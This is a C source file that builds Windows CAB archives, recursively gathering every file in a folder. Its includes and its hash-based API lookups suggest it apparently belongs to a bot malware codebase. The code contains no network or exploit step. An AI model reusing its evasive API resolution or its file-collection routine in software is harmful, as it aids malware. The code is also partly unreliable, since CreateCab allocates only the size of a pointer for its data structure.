//#include <windows.h>
/*#include <fci.h>
#include <io.h>
#include <fcntl.h>*/
//#include "stdafx.h"

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
/*
#include "BotUtils.h"
#include "Utils.h"
#include "Unhook.h"
#include "Splice.h"
#include "Loader.h"
#include "Unhook.h"
#include "BotConfig.h"*/
//#include "ntdll"
#include "CabPacker.h"

//#define RVATOVA( base, offset ) ( (DWORD)base + (DWORD)offset )

//cab packing

LPVOID DIAMONDAPI FN_FCIALLOC( ULONG cb )
{
	return MemAlloc( cb );
}

void DIAMONDAPI FN_FCIFREE( void HUGE *lpMem )
{
	if( lpMem )
	{
		MemFree( lpMem );
	}
}

INT_PTR DIAMONDAPI FN_FCIOPEN( char FAR *pszFile, int oflag, int pmode, int FAR *err, void FAR *pv )
{
	HANDLE hFile = NULL;

    DWORD dwDesiredAccess		= 0; 
    DWORD dwCreationDisposition = 0;

    UNREFERENCED_PARAMETER(pv);
    UNREFERENCED_PARAMETER(pmode);

    if ( oflag & _O_RDWR )
    {
        dwDesiredAccess = GENERIC_READ | GENERIC_WRITE;
    }
    else if ( oflag & _O_WRONLY )
    {
        dwDesiredAccess = GENERIC_WRITE;
    }
    else
    {
        dwDesiredAccess = GENERIC_READ;
    }

    if ( oflag & _O_CREAT )
    {
        dwCreationDisposition = CREATE_ALWAYS;
    }
    else
    {
        dwCreationDisposition = OPEN_EXISTING;
    }

    hFile = (HANDLE)pCreateFileA(pszFile, 
                        dwDesiredAccess,
                        FILE_SHARE_READ,
                        NULL,
                        dwCreationDisposition,
                        FILE_ATTRIBUTE_NORMAL,
                        NULL);

    if ( hFile == INVALID_HANDLE_VALUE )
    {
        *err = (DWORD)pGetLastError();
    }

    return (INT_PTR)hFile;
}


UINT DIAMONDAPI FN_FCIREAD( INT_PTR hf, void FAR *memory, UINT cb, int FAR *err, void FAR *pv)
{
	DWORD dwBytesRead = 0;

    UNREFERENCED_PARAMETER(pv);

    if( (BOOL)pReadFile((HANDLE)hf, memory, cb, &dwBytesRead, NULL) == FALSE )
    {
        dwBytesRead = (DWORD)-1;
        *err = (DWORD)pGetLastError();
    }
		 
    return dwBytesRead;
}

UINT DIAMONDAPI FN_FCIWRITE( INT_PTR hf, void FAR *memory, UINT cb, int FAR *err, void FAR *pv )
{
	DWORD dwBytesWritten = 0;

    UNREFERENCED_PARAMETER(pv);

    if ( (BOOL)pWriteFile( (HANDLE)hf, memory, cb, &dwBytesWritten, NULL) == FALSE )
    {
        dwBytesWritten = (DWORD)-1;
        *err = (DWORD)pGetLastError();
    }

    return dwBytesWritten;
}


int DIAMONDAPI FN_FCICLOSE( INT_PTR hf, int FAR *err, void FAR *pv )
{
	INT iResult = 0; 

    UNREFERENCED_PARAMETER(pv);
    
    if ( (BOOL)pCloseHandle((HANDLE)hf) == FALSE)
    {
        *err = (DWORD)pGetLastError();
        iResult = -1;
    }

    return iResult;
}

long DIAMONDAPI FN_FCISEEK( INT_PTR hf, long dist, int seektype, int FAR *err, void FAR *pv )
{
	INT iResult = 0;

    UNREFERENCED_PARAMETER(pv);

    iResult = (INT)pSetFilePointer((HANDLE)hf, dist, NULL, seektype);

    if ( iResult == -1 )
    {
        *err = (DWORD)pGetLastError();
    }

    return iResult;
}


int DIAMONDAPI FN_FCIDELETE( char FAR *pszFile, int FAR *err, void FAR *pv )
{
	INT iResult = 0;

    UNREFERENCED_PARAMETER(pv);

    if ( (BOOL)pDeleteFileA(pszFile) == FALSE)
    {
        *err = (DWORD)pGetLastError();
        iResult = -1;
    }

    return iResult;
}


long DIAMONDAPI FN_FCISTATUS( UINT typeStatus, ULONG  cb1, ULONG  cb2, void FAR *pv )
{
	return 0;
}

int DIAMONDAPI FN_FCIFILEPLACED( PCCAB pccab, char *pszFile, long  cbFile, BOOL  fContinuation, void FAR *pv )
{
	return 0;
}


INT_PTR DIAMONDAPI FN_FCIGETOPENINFO( char *pszName, USHORT *pdate, USHORT *ptime, USHORT *pattribs, int FAR *err, void FAR *pv )
{
	HANDLE hFile;
    FILETIME fileTime;
    BY_HANDLE_FILE_INFORMATION fileInfo;

    hFile = (HANDLE)FN_FCIOPEN(pszName, _O_RDONLY, 0, err, pv);

    if ( hFile != (HANDLE)-1 )
    {
        if( (BOOL)pGetFileInformationByHandle(hFile, &fileInfo) 
        &&  (BOOL)pFileTimeToLocalFileTime(&fileInfo.ftCreationTime, &fileTime)
        &&  (BOOL)pFileTimeToDosDateTime(&fileTime, pdate, ptime) )
        {
            *pattribs = (USHORT)fileInfo.dwFileAttributes;
            *pattribs &= ( _A_RDONLY | _A_HIDDEN | _A_SYSTEM | _A_ARCH );
        }
        else
        {
            FN_FCICLOSE((INT_PTR)hFile, err, pv);
            hFile = (HANDLE)-1;
        }
    }

    return (INT_PTR)hFile;
}


BOOL DIAMONDAPI FN_FCIGETTEMPFILE( char *pszTempName, int cbTempName, void FAR *pv )
{
	BOOL bSucceeded = FALSE;
    CHAR pszTempPath[MAX_PATH];

    UNREFERENCED_PARAMETER(pv);
    UNREFERENCED_PARAMETER(cbTempName);

    if( (DWORD)pGetTempPathA(MAX_PATH, pszTempPath) != 0 )
    {
        if( (DWORD)pGetTempFileNameA(pszTempPath, "CABINET", 0, pszTempName) != 0 )
        {
            bSucceeded = TRUE;
        }
    }

    return bSucceeded;
}

BOOL DIAMONDAPI FN_FCIGETNEXTCABINET(
	PCCAB  pccab,
	ULONG  cbPrevCab,
	void FAR *pv)
{
	return FALSE;
}




HCAB CreateCab( const char *szCabName )
{
	PCABDATA pC = (PCABDATA)MemAlloc( sizeof( PCABDATA ) );
	m_lstrcpy( pC->cab.szCab, szCabName );
	m_memset(pC->cab.szCabPath, 0, 1);
	pC->cab.cb = 0x7FFFFFFF;

	typedef HFCI (*PFCICreate )( PERF perf, PFNFCIFILEPLACED pfnfiledest, PFNFCIALLOC pfnalloc,
											 PFNFCIFREE pfnfree, PFNFCIOPEN pfnopen, PFNFCIREAD pfnread, PFNFCIWRITE pfnwrite,
											 PFNFCICLOSE pfnclose, PFNFCISEEK pfnseek, PFNFCIDELETE pfndelete, PFNFCIGETTEMPFILE pfnfcigtf,
											 PCCAB pccab, void FAR *pv );

	PFCICreate pFCICreate = (PFCICreate)GetProcAddressEx( NULL, 13, 0x6A3F5C7A );

	pC->hfci = pFCICreate(
		&(pC->erf),
		FN_FCIFILEPLACED, 
		FN_FCIALLOC,
		FN_FCIFREE,
		FN_FCIOPEN,
		FN_FCIREAD,
		FN_FCIWRITE,
		FN_FCICLOSE,
		FN_FCISEEK,
		FN_FCIDELETE,
		FN_FCIGETTEMPFILE,
		&(pC->cab),
		0 );

	if( pC->hfci == NULL )
	{
		MemFree( pC );
		return 0;
	}
	return pC;
}


bool AddFileToCab( HCAB handle, const char *szFileName, const char *szInternalName )
{
	if( handle == NULL )
	{
		return false;
	}

	CABDATA *pC = (CABDATA*)handle;

	typedef BOOL (*PFCIAddFile )( HFCI hfci, LPSTR pszSourceFile, LPSTR pszFileName, BOOL fExecute, PFNFCIGETNEXTCABINET GetNextCab,
								  PFNFCISTATUS pfnProgress, PFNFCIGETOPENINFO pfnOpenInfo, TCOMP typeCompress );

	PFCIAddFile pFCIAddFile = (PFCIAddFile)GetProcAddressEx( NULL, 13, 0xB497160 );

	if( pFCIAddFile(pC->hfci, (char*)szFileName, (char*)szInternalName, FALSE, FN_FCIGETNEXTCABINET, FN_FCISTATUS, FN_FCIGETOPENINFO, tcompTYPE_MSZIP ))
	{
		return true;
	}

	return false;
}



void CloseCab( HCAB handle )
{
	if( handle == NULL )
	{
		return;
	}

	CABDATA *pC = (CABDATA*)handle;

	typedef BOOL (*PFCIDestroy)( HFCI hfci );
	typedef BOOL (*FCIFlushCabinet)( HFCI hfci, BOOL fGetNextCab, PFNFCIGETNEXTCABINET GetNextCab, PFNFCISTATUS pfnProgress );

	PFCIDestroy pFCIDestroy			 = (PFCIDestroy)GetProcAddressEx( NULL, 13, 0x7D0FA4F5 );
	FCIFlushCabinet	pFCIFlushCabinet = (FCIFlushCabinet)GetProcAddressEx( NULL, 13, 0xC27267DA );


	pFCIFlushCabinet(
		pC->hfci,
		FALSE,
		FN_FCIGETNEXTCABINET,
		FN_FCISTATUS );

	pFCIDestroy( pC->hfci );

	//MemFree( pC );
}


struct FILEENTRY
{
	char szName[MAX_PATH];
	char szIName[MAX_PATH];
	FILEENTRY *pNext;
};

void FreeList(
	FILEENTRY **ppFiles )
{
	while( *ppFiles )
	{
		FILEENTRY *toDelete = *ppFiles;
		*ppFiles = (*ppFiles)->pNext;

		MemFree( toDelete );
	}
}

void ScanFiles(
	const char *szDirName, const char *szInternalName,
	FILEENTRY **ppFiles )
{
	char findmask[MAX_PATH];
	m_memset( findmask, 0, MAX_PATH );

	m_lstrcpy( findmask, szDirName );
	m_lstrcat( findmask, "\\*.*" );

	WIN32_FIND_DATA fdata;
	m_memset( &fdata, 0, sizeof( WIN32_FIND_DATA ) );

	HANDLE hFind = (HANDLE)pFindFirstFileA( findmask, &fdata );
	if( hFind != INVALID_HANDLE_VALUE )
	{
		do
		{
			if( fdata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
			{
				if( m_lstrcmp(fdata.cFileName,".") != 0 &&
					m_lstrcmp(fdata.cFileName,"..") != 0 )
				{
					char findmask2[MAX_PATH];
					m_memset( findmask2, 0, MAX_PATH );

					m_lstrcpy( findmask2, szDirName );
					m_lstrcat( findmask2, "\\" );
					m_lstrcat( findmask2, fdata.cFileName );

					char findmask3[MAX_PATH];
					m_memset( findmask3, 0, MAX_PATH );

					m_lstrcpy( findmask3, szInternalName );
					m_lstrcat( findmask3, "\\" );
					m_lstrcat( findmask3, fdata.cFileName );

					ScanFiles( findmask2, findmask3, ppFiles );
				}
			}
			else
			{
				char fullname[MAX_PATH];
				m_memset( fullname, 0, MAX_PATH );

				m_lstrcpy( fullname, szDirName );
				m_lstrcat( fullname, "\\" );
				m_lstrcat( fullname, fdata.cFileName );

				char iname[MAX_PATH];
				m_memset( iname, 0, MAX_PATH );

				m_lstrcpy( iname, szInternalName );
				m_lstrcat( iname, "\\" );
				m_lstrcat( iname, fdata.cFileName );

				if( *ppFiles == NULL )
				{
					*ppFiles = (FILEENTRY*)MemAlloc( sizeof( FILEENTRY ) );
					(*ppFiles)->pNext = 0;
				}
				else
				{
					FILEENTRY *p = (FILEENTRY*)MemAlloc( sizeof( FILEENTRY ) );
					p->pNext = *ppFiles;
					*ppFiles = p;
				}

				m_lstrcpy( (*ppFiles)->szName, fullname );
				m_lstrcpy( (*ppFiles)->szIName, iname );
			}
		}
		while( (BOOL)pFindNextFileA( hFind, &fdata ) );

		pFindClose( hFind );
	}
}

bool AddDirToCab( HCAB handle, const char *szDirName, const char *szInternalName )
{
	FILEENTRY *pFiles = 0;
	ScanFiles( szDirName, szInternalName, &pFiles );

	if( pFiles )
	{
		for( FILEENTRY *p = pFiles; p != NULL; p=p->pNext )
		{
			if( !AddFileToCab( handle, p->szName, p->szIName ) )
			{
				FreeList( &pFiles );
				return false;
			}
		}
	}

	FreeList( &pFiles );
	return true;
}

void Test()
{
	HCAB h = CreateCab( "my.cab" );
	AddDirToCab( h, "J:", "Folder" );
	CloseCab( h );

	return;
}

char *GetTempNameA()
{
	char *TempPath = (char*)MemAlloc( 512 );
	char *FileName = (char*)MemAlloc( 512 );

	if ( !TempPath || !FileName )
	{
		return NULL;
	}

	pGetTempPathA( 512, TempPath );
	pGetTempFileNameA( TempPath, "", 0, FileName );

	MemFree( TempPath );

	return FileName;
}

void CAB_Test2()
{
	char *Path = GetTempNameA();
	HCAB h = CreateCab( Path );
	AddFileToCab( h, "", "Text.txt" );
	CloseCab( h );

	return;
}
/*

int sizeRecurseFolder(char* Absolute, char* Relative, char* ext, HCAB hCab)
{
	int weight = 0;
	WIN32_FIND_DATA data;
	char cPath[512];
	m_lstrcpy(&cPath[0],Absolute);
	m_lstrcat(&cPath[0],"\\");
	m_lstrcat(&cPath[0],Relative);
	if(m_lstrlen(Relative)>0)
	m_lstrcat(&cPath[0],"\\");
	m_lstrcat(&cPath[0],"*.*");
	HANDLE nFind = (HANDLE)pFindFirstFileA(cPath,&data);
	DWORD err = (DWORD)pGetLastError();
	if(nFind == NULL) return -1;
	do
	{
		if((m_lstrcmp(data.cFileName,"..")==0) || (m_lstrcmp(data.cFileName,".")==0)) continue;
		if ((data.dwFileAttributes & 0x10) != 0)
		{
			char rel[512];
			m_lstrcpy(rel,Relative);
			if(m_lstrcmp(Relative,"")!=0)
			m_lstrcat(rel,"\\");
			m_lstrcat(rel,data.cFileName);
			weight += sizeRecurseFolder(Absolute, rel, ext, hCab);
			//weight += sizeRecurseFolder(Absolute, rel, ext, hZip);
		}
		else
		{
			char *name = m_strstr(data.cFileName, ext);
			if(m_lstrcmp(ext,"*") != 0 && (name == NULL || m_lstrcmp(name, ext) != 0) ) continue;
			
			char rel[512];
			m_lstrcpy(rel,Relative);
			if(m_lstrcmp(Relative,"")!=0)
			m_lstrcat(rel,"\\");
			m_lstrcat(rel,data.cFileName);

			char abs[512];
			m_lstrcpy(abs, Absolute);
			m_lstrcat(abs, "\\");
			m_lstrcat(abs,rel);

			if(!AddFileToCab(hCab, abs, abs))
			//if(ZipAdd(hZip, rel, abs, 0, ZIP_FILENAME)!=ZR_OK)
			{
				//998	ERROR_NOACCESS - Invalid access to memory location.
				//32	ERROR_SHARING_VIOLATION - The process cannot access the file because it is being used by another process.
				DWORD err = (DWORD)pGetLastError();	
				err=err;
			}
			weight += (int)(((int)data.nFileSizeHigh<<16) + (int)data.nFileSizeLow);
		}
	}
	while((BOOL)FindNextFile(nFind,&data));

	pFindClose(nFind);
	return weight;
}*/